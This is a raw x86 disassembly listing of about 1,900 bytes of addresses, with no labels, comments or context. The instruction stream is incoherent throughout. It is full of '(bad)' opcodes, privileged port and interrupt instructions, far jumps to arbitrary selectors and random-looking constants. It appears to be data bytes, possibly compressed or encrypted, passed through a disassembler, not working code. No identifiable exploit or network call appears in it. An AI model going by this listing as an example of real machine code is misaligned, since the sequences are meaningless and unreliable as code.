  421d65:	rcl    BYTE PTR [edi],1
  421d67:	mov    eax,0x1cf1f462
  421d6c:	xchg   ebx,eax
  421d6d:	jmp    0x8555:0xe7f63688
  421d74:	fdiv   DWORD PTR [edi+eax*4-0x2b]
  421d78:	cli    
  421d79:	mov    edx,0x59b46d35
  421d7e:	ins    BYTE PTR es:[edi],dx
  421d7f:	sub    eax,0x9c806499
  421d84:	jge    0x421d90
  421d86:	icebp  
  421d87:	inc    ebp
  421d88:	mov    bh,0xc8
  421d8a:	pop    ebx
  421d8b:	ss jl  0x421d7d
  421d8e:	cmp    BYTE PTR [edi+edi*8+0x24],0x48
  421d93:	mov    cl,0x23
  421d95:	xchg   esi,eax
  421d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d97:	popa   
  421d98:	sbb    bh,BYTE PTR [eax+0x3fbec308]
  421d9e:	ret    
  421d9f:	test   BYTE PTR [esi+eiz*1-0x1d6fb612],ch
  421da6:	cmp    eax,0xfe7c105a
  421dab:	dec    ebx
  421dac:	xchg   ebx,eax
  421dad:	sbb    al,0xea
  421daf:	pop    ebp
  421db0:	xchg   BYTE PTR [esi-0x445b0987],ah
  421db6:	mov    dh,0x3a
  421db8:	mov    al,ds:0x48e13630
  421dbd:	icebp  
  421dbe:	cmc    
  421dbf:	jae    0x421d93
  421dc1:	dec    edi
  421dc2:	push   0x1b7ffbc8
  421dc7:	sti    
  421dc8:	add    eax,0x2dfb4fcd
  421dcd:	shl    DWORD PTR [edi],cl
  421dcf:	sar    BYTE PTR [ecx+edx*4+0x28480679],1
  421dd6:	adc    dl,0xce
  421dd9:	mov    dl,0x47
  421ddb:	mov    gs,WORD PTR [edi]
  421ddd:	shl    DWORD PTR [ecx],1
  421ddf:	or     ebp,eax
  421de1:	or     al,0x3a
  421de3:	pop    ds
  421de4:	push   0xc
  421de6:	xor    al,0x0
  421de8:	mov    bh,BYTE PTR [edx+0x6e]
  421deb:	xchg   ecx,eax
  421dec:	dec    ebx
  421ded:	sar    al,1
  421def:	sub    al,BYTE PTR [esi-0x535e0243]
  421df5:	pop    eax
  421df6:	or     BYTE PTR [edx],dh
  421df8:	mov    cl,0x45
  421dfa:	cmp    eax,0x91cc4b12
  421dff:	je     0x421d9a
  421e01:	ja     0x421dd4
  421e03:	or     BYTE PTR [ebx+0x3e],ah
  421e06:	pop    es
  421e07:	cmp    esi,DWORD PTR [eax+0x68a88ffc]
  421e0d:	loop   0x421e86
  421e0f:	ins    DWORD PTR es:[edi],dx
  421e10:	xchg   edx,eax
  421e11:	(bad)  
  421e12:	fstp   TBYTE PTR [edx-0x1aee7d39]
  421e18:	and    BYTE PTR [ecx+0x9715418],ch
  421e1e:	jmp    0x421da0
  421e20:	stc    
  421e21:	sbb    al,0xc1
  421e23:	pop    es
  421e24:	adc    eax,0x632e3c2d
  421e29:	mov    DWORD PTR [esi+0x30edbe5a],edi
  421e2f:	out    0x85,al
  421e31:	dec    eax
  421e32:	add    DWORD PTR [ecx+0x5a78d9d5],0x43
  421e39:	mov    cl,cl
  421e3b:	sub    eax,0xcf3488f
  421e40:	mov    edi,0x50c3be90
  421e45:	sub    DWORD PTR [edx-0x32564e56],0x564f7753
  421e4f:	(bad)  
  421e50:	loop   0x421dd9
  421e52:	pop    ss
  421e53:	std    
  421e54:	inc    ebp
  421e55:	xor    eax,0xb5441f44
  421e5a:	(bad)  
  421e5b:	cs mov edi,0xe8b4d511
  421e61:	loopne 0x421e14
  421e63:	fsubr  QWORD PTR [ecx-0x42]
  421e66:	shr    ch,0xd2
  421e69:	loopne 0x421eb9
  421e6b:	cmc    
  421e6c:	int3   
  421e6d:	scas   al,BYTE PTR es:[edi]
  421e6e:	mov    DWORD PTR [ecx-0x58b92344],ebx
  421e74:	loopne 0x421ec5
  421e76:	out    0x26,eax
  421e78:	mov    ebp,DWORD PTR [ecx+0x77]
  421e7b:	push   ecx
  421e7c:	inc    esp
  421e7d:	retf   
  421e7e:	push   cs
  421e7f:	mov    eax,ds:0xa26fcfe
  421e84:	mov    al,0xb0
  421e86:	int3   
  421e87:	push   0x58
  421e89:	push   cs
  421e8a:	jno    0x421e95
  421e8c:	cwde   
  421e8d:	scas   al,BYTE PTR es:[edi]
  421e8e:	das    
  421e8f:	push   ecx
  421e90:	(bad)  
  421e91:	popa   
  421e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e93:	adc    dl,dh
  421e95:	sbb    eax,0x67b32990
  421e9a:	repz lds eax,FWORD PTR [esi-0x3e]
  421e9e:	iret   
  421e9f:	jno    0x421ee2
  421ea1:	adc    ah,dh
  421ea3:	sar    BYTE PTR [edi+0x32],cl
  421ea6:	addr16 test al,0xf4
  421ea9:	lds    ebp,FWORD PTR [esi-0x48]
  421eac:	cmp    DWORD PTR [ebx+0x59],esp
  421eaf:	ins    BYTE PTR es:[edi],dx
  421eb0:	rcl    DWORD PTR [esi+0x2769d9f7],1
  421eb6:	stos   BYTE PTR es:[di],al
  421eb8:	dec    edx
  421eb9:	sbb    BYTE PTR [edx],0xc8
  421ebc:	int3   
  421ebd:	retf   
  421ebe:	fidivr WORD PTR [edi]
  421ec0:	jae    0x421f2a
  421ec2:	mov    WORD PTR [esi],ss
  421ec4:	jno    0x421e80
  421ec6:	out    dx,al
  421ec7:	add    BYTE PTR [edi],dh
  421ec9:	repz inc ecx
  421ecb:	add    BYTE PTR [esi+ebx*1-0x4c],dl
  421ecf:	jne    0x421ee3
  421ed1:	mov    esi,0xbb15c717
  421ed6:	xchg   esi,eax
  421ed7:	lods   eax,DWORD PTR ds:[esi]
  421ed8:	xlat   BYTE PTR ds:[ebx]
  421ed9:	shl    BYTE PTR [ebx],cl
  421edb:	(bad)  
  421edc:	jns    0x421f25
  421ede:	sub    edx,esi
  421ee0:	lahf   
  421ee1:	stc    
  421ee2:	pop    ebx
  421ee3:	sub    ah,BYTE PTR [ebp-0x62]
  421ee6:	or     al,dl
  421ee8:	inc    ebx
  421ee9:	mov    al,ds:0x3dc00d09
  421eee:	mov    ds:0x13bae5c3,eax
  421ef3:	cs push edi
  421ef5:	jne    0x421e95
  421ef7:	dec    ebx
  421ef8:	in     al,dx
  421ef9:	adc    DWORD PTR ds:[ebx+0x60],edx
  421efd:	pop    eax
  421efe:	mov    esi,0xe99b2f3d
  421f03:	dec    ebx
  421f04:	and    BYTE PTR es:[ebx+0x32],bh
  421f08:	inc    edx
  421f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f0a:	and    BYTE PTR [edi],dh
  421f0c:	scas   eax,DWORD PTR es:[edi]
  421f0d:	arpl   WORD PTR [ecx+0x7c],ax
  421f10:	mov    DWORD PTR [edx-0x44c66f4a],ebp
  421f16:	and    BYTE PTR [eax-0x38],dl
  421f19:	jns    0x421f67
  421f1b:	jno    0x421f24
  421f1d:	pop    ss
  421f1e:	xchg   DWORD PTR [esi-0x5e21cb72],esp
  421f24:	jne    0x421eff
  421f26:	aad    0x15
  421f28:	jge    0x421ed9
  421f2a:	jno    0x421ef1
  421f2c:	dec    ebx
  421f2d:	sub    esp,DWORD PTR [eax-0x4c17a4e7]
  421f33:	add    cl,bl
  421f35:	test   bh,ah
  421f37:	test   BYTE PTR [esi],bh
  421f39:	dec    ecx
  421f3a:	clc    
  421f3b:	mov    cl,0x28
  421f3d:	inc    ebp
  421f3e:	ficomp WORD PTR [edx+eiz*8]
  421f41:	aaa    
  421f42:	sbb    bh,BYTE PTR [ebx+0x447a74d1]
  421f48:	cwde   
  421f49:	mov    gs,WORD PTR [ecx+0x597fbb8a]
  421f4f:	pop    edi
  421f50:	jge    0x421f2d
  421f52:	sahf   
  421f53:	outs   dx,DWORD PTR ds:[esi]
  421f54:	push   0x69edc79
  421f59:	inc    ecx
  421f5a:	btc    esi,esp
  421f5d:	jo     0x421f8d
  421f5f:	push   cs
  421f60:	or     dl,BYTE PTR [edi+0x2ddd72ae]
  421f66:	jno    0x421fb4
  421f68:	inc    ebp
  421f69:	push   eax
  421f6a:	and    al,0xb4
  421f6c:	shl    BYTE PTR [esi],0xb2
  421f6f:	dec    edx
  421f70:	inc    DWORD PTR gs:[esi-0x6]
  421f74:	mov    bl,bl
  421f76:	pop    ebx
  421f77:	cmp    DWORD PTR [eax+eiz*8],eax
  421f7a:	scas   eax,DWORD PTR es:[edi]
  421f7b:	dec    eax
  421f7c:	shl    BYTE PTR [ecx-0x2ece20bf],cl
  421f82:	test   BYTE PTR [edi+ebx*2-0x27c2e27f],dh
  421f89:	inc    ecx
  421f8a:	xchg   esp,eax
  421f8b:	cmp    eax,0xb4c75164
  421f90:	cmp    DWORD PTR [esi],0xffa9fc1b
  421f96:	and    BYTE PTR [edx-0x43],cl
  421f99:	jp     0x421f40
  421f9b:	mov    cl,0xfd
  421f9d:	adc    BYTE PTR [ebp+0x1a],al
  421fa0:	jmp    0x421f48
  421fa2:	inc    eax
  421fa3:	ret    0xebf2
  421fa6:	jg     0x421fef
  421fa8:	sbb    eax,0xcd49b640
  421fad:	imul   esi,DWORD PTR [eax+0x3b],0xffffff9b
  421fb1:	in     al,0xe3
  421fb3:	add    BYTE PTR [eax-0x4b],0xf0
  421fb7:	aam    0x1c
  421fb9:	push   eax
  421fba:	xor    DWORD PTR [esi+0x7b],eax
  421fbd:	add    DWORD PTR ds:0xea7df1a5,esi
  421fc3:	pop    eax
  421fc4:	shl    DWORD PTR [edx-0x6e0ca4d2],cl
  421fca:	retf   
  421fcb:	pop    ebx
  421fcc:	in     al,dx
  421fcd:	mov    eax,ds:0xe4a2843b
  421fd2:	inc    ebx
  421fd3:	mov    esi,0xfb7a322b
  421fd8:	sbb    BYTE PTR [eax-0x6f83b992],cl
  421fde:	cli    
  421fdf:	adc    al,0x60
  421fe1:	sub    eax,DWORD PTR [eax+ebp*1+0x47]
  421fe5:	imul   esp,DWORD PTR [edx+0x58925b73],0x4a
  421fec:	jb     0x422014
  421fee:	add    eax,0x29ea82b
  421ff3:	aam    0xf8
  421ff5:	stc    
  421ff6:	nop
  421ff7:	lock and ecx,DWORD PTR [ecx]
  421ffa:	xlat   BYTE PTR ds:[ebx]
  421ffb:	add    ebp,DWORD PTR [eax]
  421ffd:	test   BYTE PTR [edx],al
  421fff:	mov    ?,WORD PTR [ebx-0x43e7aae3]
  422005:	mov    WORD PTR [edx],fs
  422007:	and    eax,0x36dee096
  42200c:	push   esi
  42200d:	adc    al,0x1e
  42200f:	pop    ecx
  422010:	and    DWORD PTR [ebp-0x42],esi
  422013:	ret    0x8c9a
  422016:	int3   
  422017:	jecxz  0x42203e
  422019:	popa   
  42201a:	or     dl,BYTE PTR [edx+0x76dae202]
  422020:	add    cl,BYTE PTR [edx-0x18052875]
  422026:	pop    ebx
  422027:	ins    DWORD PTR es:[edi],dx
  422028:	sub    DWORD PTR [edx],esi
  42202a:	jb     0x422000
  42202c:	pop    esi
  42202d:	mov    edi,0xd7b84ae9
  422032:	leave  
  422033:	jbe    0x422002
  422035:	xor    BYTE PTR [edi-0x5fe8b9cd],dl
  42203b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42203c:	inc    esp
  42203d:	pusha  
  42203e:	call   0xf11e:0xfd5c6ee4
  422045:	push   edx
  422046:	jae    0x42204b
  422048:	mov    ah,0xa
  42204a:	xchg   DWORD PTR [eax+esi*1+0x739ab54c],edx
  422051:	stos   DWORD PTR es:[edi],eax
  422052:	mov    ah,0xcc
  422054:	and    ah,dh
  422056:	js     0x42201d
  422058:	imul   edi,eax,0x35
  42205b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42205c:	jmp    0xafa0d2de
  422061:	or     eax,0x5ac2b09a
  422066:	int    0x35
  422068:	push   ds
  422069:	test   eax,0xa7bf596
  42206e:	jp     0x42202d
  422070:	push   esp
  422071:	aaa    
  422072:	outs   dx,BYTE PTR ds:[esi]
  422073:	mov    ds:0xf61ab400,al
  422078:	outs   dx,BYTE PTR ds:[esi]
  422079:	push   esp
  42207a:	xor    DWORD PTR [edx],ebx
  42207c:	test   eax,0x829af6ed
  422081:	ret    0x16ba
  422084:	and    eax,DWORD PTR [esi-0x36885679]
  42208a:	mov    dh,ch
  42208c:	jmp    0xac2c:0xf39f97cc
  422093:	mov    dl,0x30
  422095:	(bad)  
  422096:	pop    eax
  422097:	into   
  422098:	jge    0x422101
  42209a:	pushf  
  42209b:	shl    DWORD PTR [edx+ebp*2+0x53],cl
  42209f:	add    ah,ah
  4220a1:	cmp    bl,0xa7
  4220a4:	iret   
  4220a5:	mov    dl,0xac
  4220a7:	cli    
  4220a8:	xchg   esi,eax
  4220a9:	or     ecx,ebp
  4220ab:	out    0x39,al
  4220ad:	pop    edi
  4220ae:	push   ds
  4220af:	or     eax,0x5e4fe6b0
  4220b4:	inc    edi
  4220b5:	xor    ecx,DWORD PTR [edx+0x56839670]
  4220bb:	inc    esi
  4220bc:	mov    BYTE PTR [eax-0x62],bl
  4220bf:	xchg   esp,eax
  4220c0:	sub    dh,BYTE PTR [ecx]
  4220c2:	leave  
  4220c3:	cmc    
  4220c4:	adc    dh,BYTE PTR [edx]
  4220c6:	test   al,0x2e
  4220c8:	cli    
  4220c9:	hlt    
  4220ca:	jle    0x4220c9
  4220cc:	add    eax,0x48a54214
  4220d1:	jo     0x4220e0
  4220d3:	adc    al,0x1e
  4220d5:	add    al,bl
  4220d7:	pusha  
  4220d8:	push   edx
  4220d9:	dec    ebp
  4220da:	or     ch,cl
  4220dc:	pop    esi
  4220dd:	jge    0x4220c6
  4220df:	fadd   DWORD PTR [esi-0x6]
  4220e2:	xchg   edx,eax
  4220e3:	adc    al,0x85
  4220e5:	mov    cl,0x8d
  4220e7:	in     al,0xd9
  4220e9:	sbb    al,0x8c
  4220eb:	lahf   
  4220ec:	pop    ebx
  4220ed:	or     esi,DWORD PTR [edi]
  4220ef:	nop
  4220f0:	pop    ss
  4220f1:	dec    ebx
  4220f2:	bound  ebp,QWORD PTR [edi+0x74]
  4220f5:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220f7:	mov    dl,ah
  4220f9:	scas   al,BYTE PTR es:[edi]
  4220fa:	jb     0x422092
  4220fc:	or     esi,eax
  4220fe:	sbb    cl,BYTE PTR [esi+0x0]
  422101:	les    ebx,FWORD PTR [ebx]
  422103:	into   
  422104:	adc    DWORD PTR [esi],0xf41b630e
  42210a:	in     eax,dx
  42210b:	sar    ebx,1
  42210d:	or     eax,0x4b868c5d
  422112:	nop
  422113:	cs nop
  422115:	lahf   
  422116:	gs fwait
  422118:	inc    esi
  422119:	pop    eax
  42211a:	mov    edx,0x870a9e7c
  42211f:	or     ebp,ebx
  422121:	pop    ds
  422122:	or     eax,0x5d0a0fcf
  422127:	cmp    BYTE PTR [edx+0x7],0xd1
  42212b:	bound  ebp,QWORD PTR ds:0x2806c64f
  422131:	(bad)  
  422132:	sar    DWORD PTR [ecx-0x4124cad4],1
  422138:	sbb    DWORD PTR ds:0xfdcf39e4,0xffffffed
  42213f:	add    eax,0xa255b4c4
  422144:	cmp    ah,ch
  422146:	femms  
  422148:	sar    BYTE PTR [ebp-0x6553ed6c],cl
  42214e:	mov    ch,0x39
  422150:	shl    BYTE PTR [edx-0x78],0xad
  422154:	cmp    al,0x27
  422156:	or     BYTE PTR [edx+0x169cfed5],bl
  42215c:	pop    ecx
  42215d:	outs   dx,DWORD PTR ds:[esi]
  42215e:	pop    edi
  42215f:	and    cl,BYTE PTR [eax+eiz*8]
  422162:	sbb    BYTE PTR [esi],al
  422164:	xchg   ecx,eax
  422165:	icebp  
  422166:	jno    0x4220f4
  422168:	adc    al,0x7e
  42216a:	es mov ecx,0x75d04ab0
  422170:	xor    al,0x2c
  422172:	imul   DWORD PTR [esi+0x290e5caa]
  422178:	je     0x422115
  42217a:	(bad)
  42217d:	fisttp QWORD PTR [edx-0x53]
  422180:	dec    ebx
  422181:	leave  
  422182:	in     al,0x5f
  422184:	es retf 
  422186:	add    ebp,DWORD PTR [ebp-0x64]
  422189:	pushf  
  42218a:	idiv   ah
  42218c:	inc    ebx
  42218d:	sub    DWORD PTR [eax],edi
  42218f:	push   esp
  422190:	(bad)  
  422191:	addr16 push ebx
  422193:	sar    ch,cl
  422195:	pop    edx
  422196:	sbb    al,BYTE PTR [esi+0x2a]
  422199:	or     BYTE PTR [eax-0x38],0x98
  42219d:	mov    eax,DWORD PTR [ebx+edi*8+0x487033d5]
  4221a4:	push   eax
  4221a5:	xchg   esi,eax
  4221a6:	xchg   ebx,eax
  4221a7:	fwait
  4221a8:	mov    ecx,0xd50a9471
  4221ad:	cmc    
  4221ae:	add    al,0xa5
  4221b0:	inc    edi
  4221b1:	lods   eax,DWORD PTR ds:[esi]
  4221b2:	inc    eax
  4221b3:	jnp    0x42221c
  4221b5:	dec    esi
  4221b6:	add    DWORD PTR [eax],esp
  4221b8:	fild   QWORD PTR [ebp+0x66cdfb0b]
  4221be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221bf:	jp     0x4221be
  4221c1:	pop    esi
  4221c2:	and    DWORD PTR [ebp+0x3f6621de],ecx
  4221c8:	push   ss
  4221c9:	outs   dx,BYTE PTR ds:[esi]
  4221ca:	mov    esp,0xaf4512cd
  4221cf:	mov    eax,ds:0x58ace255
  4221d4:	aam    0x61
  4221d6:	dec    ebx
  4221d7:	jnp    0x422230
  4221d9:	jecxz  0x422223
  4221db:	jae    0x4221bb
  4221dd:	std    
  4221de:	outs   dx,BYTE PTR ds:[esi]
  4221df:	jmp    0x4221d4
  4221e1:	popa   
  4221e2:	add    BYTE PTR [edx+0x14],dh
  4221e5:	jns    0x4221bd
  4221e7:	add    DWORD PTR [ebx],0x826f0df5
  4221ed:	ror    DWORD PTR [eax+0x17],0x4d
  4221f1:	scas   eax,DWORD PTR es:[edi]
  4221f2:	mov    eax,0x6c0b8b59
  4221f7:	loop   0x4221b2
  4221f9:	nop
  4221fa:	mov    edx,0xb48c0bcc
  4221ff:	sub    eax,0xc3af1e3f
  422204:	adc    edi,esp
  422206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422207:	fidivr WORD PTR [edi+ebp*1-0x10]
  42220b:	std    
  42220c:	ficomp WORD PTR [edx+0x5c]
  42220f:	or     BYTE PTR [eax-0x5bfce54e],bl
  422215:	dec    edx
  422216:	retf   0xda36
  422219:	daa    
  42221a:	shr    BYTE PTR [ebp-0xdc8ce7a],1
  422220:	inc    ebp
  422221:	rol    DWORD PTR [ebx-0x54],0xd4
  422225:	push   ebp
  422226:	clc    
  422227:	es inc ecx
  422229:	xchg   DWORD PTR [ebx+0x2965559c],edx
  42222f:	cmp    eax,0x11855759
  422235:	out    dx,al
  422236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422237:	mov    al,0xff
  422239:	pop    ebp
  42223a:	bnd jl 0x4221ff
  42223d:	retf   
  42223e:	shr    DWORD PTR [ebp+0x49],1
  422241:	xor    eax,0x2eb65ad7
  422246:	rcr    BYTE PTR [edx-0x55ae0ee2],cl
  42224c:	out    0xfb,eax
  42224e:	mov    cl,0x3
  422250:	ja     0x422238
  422252:	aas    
  422253:	imul   DWORD PTR [ebp+eiz*2+0x13]
  422257:	ds sub al,0xb7
  42225a:	pop    esi
  42225b:	push   ss
  42225c:	test   DWORD PTR [ebx],ebx
  42225e:	lods   eax,DWORD PTR ds:[esi]
  42225f:	lea    ecx,ds:0x708ce5ba
  422265:	inc    esp
  422266:	into   
  422267:	push   ecx
  422268:	or     eax,0x4c6daa1c
  42226d:	(bad)  
  42226e:	gs cli 
  422270:	in     al,0xa6
  422272:	xlat   BYTE PTR ds:[ebx]
  422273:	pop    ecx
  422274:	push   esi
  422275:	shl    DWORD PTR ds:0x5860e581,0xf6
  42227c:	adc    edi,edi
  42227e:	jb     0x42225e
  422280:	retf   0xf86c
  422283:	jmp    0x20a3:0x5438d9b8
  42228a:	stc    
  42228b:	or     ecx,DWORD PTR [esi+0x42f542a]
  422291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422292:	cli    
  422293:	push   esp
  422294:	lods   al,BYTE PTR ds:[esi]
  422295:	arpl   WORD PTR [esi],si
  422297:	stos   DWORD PTR es:[edi],eax
  422298:	stc    
  422299:	inc    esp
  42229a:	fadd   DWORD PTR [edx+0x13]
  42229d:	adc    BYTE PTR [edi],ah
  42229f:	icebp  
  4222a0:	push   esi
  4222a1:	stos   DWORD PTR es:[edi],eax
  4222a2:	push   eax
  4222a3:	and    BYTE PTR [esi+0x75769d61],al
  4222a9:	push   ecx
  4222aa:	icebp  
  4222ab:	ret    0x9c7e
  4222ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222af:	jnp    0x42229a
  4222b1:	ret    
  4222b2:	push   esp
  4222b3:	(bad)  
  4222b4:	mov    bh,0xe8
  4222b6:	scas   eax,DWORD PTR es:[edi]
  4222b7:	cld    
  4222b8:	cmp    eax,0xcdf4455f
  4222bd:	paddq  mm0,QWORD PTR [edi+0x75]
  4222c1:	iret   
  4222c2:	sbb    eax,0x480d06d1
  4222c7:	inc    esi
  4222c8:	jge    0x42233b
  4222ca:	pop    eax
  4222cb:	or     eax,0x6a39819b
  4222d0:	adc    ah,BYTE PTR ds:0x4d1197f
  4222d6:	or     al,0x90
  4222d8:	inc    ebp
  4222d9:	fs or  bx,cx
  4222dd:	repnz xor DWORD PTR [ecx+0x59e1af82],ebp
  4222e4:	and    ecx,DWORD PTR [eax-0x52]
  4222e7:	pop    ss
  4222e8:	sbb    edx,DWORD PTR ds:0x8b1c6c63
  4222ee:	and    eax,0xe5a4d276
  4222f3:	pop    es
  4222f4:	pop    ebp
  4222f5:	loop   0x42228b
  4222f7:	add    ch,bh
  4222f9:	(bad)  
  4222fa:	bound  ecx,QWORD PTR [edi]
  4222fc:	outs   dx,DWORD PTR ds:[esi]
  4222fd:	pusha  
  4222fe:	mov    esi,0x47e8a8eb
  422303:	pop    eax
  422304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422305:	inc    edi
  422306:	icebp  
  422307:	dec    ebx
  422308:	test   BYTE PTR [esi-0x73cd9b23],cl
  42230e:	xchg   ebp,eax
  42230f:	outs   dx,BYTE PTR ds:[esi]
  422310:	jg     0x422318
  422312:	xor    ah,BYTE PTR [ecx+eiz*8+0x71]
  422316:	out    dx,al
  422317:	fdivr  DWORD PTR [esi-0x47]
  42231a:	push   cs
  42231b:	xchg   edi,eax
  42231c:	inc    eax
  42231d:	(bad)  [ebp-0x4f535395]
  422323:	retf   
  422324:	bound  edi,QWORD PTR [edi-0x2b]
  422327:	pushf  
  422328:	hlt    
  422329:	cmp    esp,ebx
  42232b:	mov    ah,0x71
  42232d:	bound  edx,QWORD PTR [edx+0x1b276fba]
  422333:	cmp    edx,DWORD PTR [edx+ebx*1]
  422336:	ret    
  422337:	and    edx,edx
  422339:	mov    WORD PTR [ebx+edi*1+0x528ee7fb],ss
  422340:	and    DWORD PTR [ebx],0x1069fabf
  422346:	lds    ecx,FWORD PTR [edx]
  422348:	out    0x3e,eax
  42234a:	cmp    edx,DWORD PTR [ebp-0x570022b0]
  422350:	pop    edi
  422351:	jne    0x4222f2
  422353:	shr    BYTE PTR [ebp+0xd],0xb9
  422357:	cwde   
  422358:	add    al,0x7a
  42235a:	jnp    0x42239c
  42235c:	mov    BYTE PTR [ebx],bl
  42235e:	mov    cl,0xfd
  422360:	lods   eax,DWORD PTR ds:[esi]
  422361:	retf   0x65d5
  422364:	iret   
  422365:	cwde   
  422366:	xor    eax,0x79f4beb7
  42236b:	lahf   
  42236c:	cli    
  42236d:	or     DWORD PTR [ecx],edx
  42236f:	xor    DWORD PTR [ebx+0x3e],eax
  422372:	cld    
  422373:	push   edi
  422374:	clc    
  422375:	fcom   QWORD PTR [esi]
  422377:	push   esi
  422378:	leave  
  422379:	lds    edx,FWORD PTR [ebp-0x66]
  42237c:	hlt    
  42237d:	fild   QWORD PTR [ebp+0x566c12c]
  422383:	or     eax,0x949d3aa
  422388:	ret    0x92ee
  42238b:	fdiv   DWORD PTR [eax]
  42238d:	jmp    FWORD PTR [esi+0x35]
  422390:	add    bh,BYTE PTR [ebx-0x4f8f955b]
  422396:	lock dec ebp
  422398:	lock fidiv WORD PTR gs:[esi+eiz*1]
  42239d:	add    DWORD PTR [ebx+0x1f723d15],esp
  4223a3:	jo     0x42235d
  4223a5:	repnz sub DWORD PTR [edi-0x58],0xffffffbf
  4223aa:	mov    ch,0xd3
  4223ac:	sub    dl,BYTE PTR [ecx-0x70e52369]
  4223b2:	in     al,0x7a
  4223b4:	sub    eax,0x64a91a7c
  4223b9:	mov    bh,0xed
  4223bb:	popf   
  4223bc:	ins    DWORD PTR es:[edi],dx
  4223bd:	popa   
  4223be:	jmp    0x4fb0:0xbe995ca5
  4223c5:	stos   DWORD PTR es:[edi],eax
  4223c6:	and    BYTE PTR [ecx-0x548916bb],0xb9
  4223cd:	je     0x42236a
  4223cf:	and    dl,ah
  4223d1:	dec    ebx
  4223d2:	mov    esp,0x744d4d00
  4223d7:	or     al,0x81
  4223d9:	sub    edi,DWORD PTR [edx+eax*2]
  4223dc:	stos   DWORD PTR es:[edi],eax
  4223dd:	xchg   esi,eax
  4223de:	jg     0x422383
  4223e0:	test   al,0x1b
  4223e2:	inc    ebp
  4223e3:	mov    al,BYTE PTR [edx]
  4223e5:	inc    ebx
  4223e6:	xor    DWORD PTR [edx+0x518226cf],ebp
  4223ec:	ja     0x422415
  4223ee:	mov    BYTE PTR ds:[ebp+0x25],cl
  4223f2:	imul   edi,DWORD PTR [esi+eiz*2-0x6dfa4363],0xa7e7ba11
  4223fd:	nop
  4223fe:	enter  0x7360,0x7
  422402:	shl    DWORD PTR [ebp+0x7f],cl
  422405:	pop    edx
  422406:	nop
  422407:	retf   0xbe7e
  42240a:	adc    edi,DWORD PTR [esi]
  42240c:	xor    al,0xf5
  42240e:	jbe    0x422394
  422410:	jns    0x4223a3
  422412:	aam    0xf6
  422414:	cwde   
  422415:	sub    dl,bl
  422417:	lahf   
  422418:	lods   al,BYTE PTR ds:[esi]
  422419:	pop    ecx
  42241a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42241b:	xor    BYTE PTR [edx-0x3ca5723c],dh
  422421:	loope  0x42247e
  422423:	mov    dl,0x7b
  422425:	mov    edx,0x461e6fdf
  42242a:	lds    eax,FWORD PTR [edi-0x20]
  42242d:	addr16 jl 0x422443
  422430:	cli    
  422431:	jne    0x42249a
  422433:	loope  0x422432
  422435:	jl     0x42240a
  422437:	rol    BYTE PTR [ebp+eax*1-0x74],cl
  42243b:	retf   
  42243c:	cld    
  42243d:	aaa    
  42243e:	jmp    0x8027:0x9b7918f
  422445:	dec    ebx
  422446:	test   DWORD PTR [ecx+0x52601d57],esi
  42244c:	push   es
  42244d:	into   
  42244e:	adc    ch,BYTE PTR [edi+0x44]
  422451:	pop    esi
  422452:	imul   esi,DWORD PTR [ebx],0x56
  422455:	mov    ah,0x10
  422457:	les    eax,FWORD PTR [ebp-0x63ce925d]
  42245d:	ins    DWORD PTR es:[edi],dx
  42245e:	mov    edx,0xf3f02640
  422463:	fcmovnb st,st(7)
  422465:	mov    esp,0x726fc220
  42246a:	jecxz  0x4224e8
  42246c:	sub    eax,0x520b46df
  422471:	dec    esi
  422472:	jl     0x4224ca
  422474:	not    DWORD PTR [ebx+0x23]
  422477:	call   DWORD PTR [esi+0x52a75b5]
  42247d:	inc    esp
  42247e:	adc    ecx,DWORD PTR [ecx]
  422480:	into   
  422481:	mov    ch,0xa8
  422483:	setl   BYTE PTR [ecx+edx*4-0x4f432ca6]
  42248b:	loopne 0x4224dd
  42248d:	mov    ecx,0x9a63b76a
  422492:	scas   eax,DWORD PTR es:[di]
  422494:	cmp    bh,dh
  422496:	es sub ax,0x6d32
  42249b:	sar    esp,1
  42249d:	icebp  
  42249e:	aas    
  42249f:	fcmovnb st,st(2)
  4224a1:	push   0x18e18ba0
  4224a6:	xlat   BYTE PTR ds:[ebx]
  4224a7:	inc    ebx
  4224a8:	mov    ecx,0x9a4d8faa
  4224ad:	pop    esi
  4224ae:	mov    BYTE PTR [edx-0x13dbb390],dl
  4224b4:	aam    0x58
  4224b6:	lea    esp,ds:0xc81fec14
  4224bc:	or     eax,0x3e557d36
  4224c1:	sbb    eax,0x59325eab
  4224c6:	mov    ds:0xc0f04fd7,eax
  4224cb:	sbb    DWORD PTR [ecx],0x18002fd0
  4224d1:	(bad)  
  4224d2:	pop    ds
  4224d3:	pop    ds
  4224d4:	mov    edx,esi
  4224d6:	pop    es
  4224d7:	xor    DWORD PTR [ebp-0x54],0xd7a62612
  4224de:	lock ins BYTE PTR es:[edi],dx
  4224e0:	shr    bh,cl
  4224e2:	xchg   edx,eax
  4224e3:	scas   eax,DWORD PTR es:[edi]
  4224e4:	fld    DWORD PTR [edx+ecx*1]
  4224e7:	jmp    0x5b74:0x414d8614
  4224ee:	mov    ds:0x36aa025e,al
  4224f3:	mov    ah,BYTE PTR [edx]
  4224f5:	inc    ecx
  4224f6:	fcmove st,st(5)
  4224f8:	xchg   DWORD PTR [edx-0x1f9dc98a],edi
  4224fe:	jp     0x42251a
  422500:	imul   esp,DWORD PTR [esi],0x73
  422503:	in     al,0xe3
  422505:	jb     0x4224c4
  422507:	mov    al,0x59
  422509:	bound  ebx,QWORD PTR [esp+esi*2]
  42250c:	fcmovbe st,st(7)
  42250e:	in     al,dx
  42250f:	les    edx,FWORD PTR [eax-0xf]
  422512:	xor    eax,0x91c03411
  422517:	test   DWORD PTR [edx+ebp*1],edi
  42251a:	push   esp
  42251b:	pop    ss
  42251c:	iret   
  42251d:	push   eax
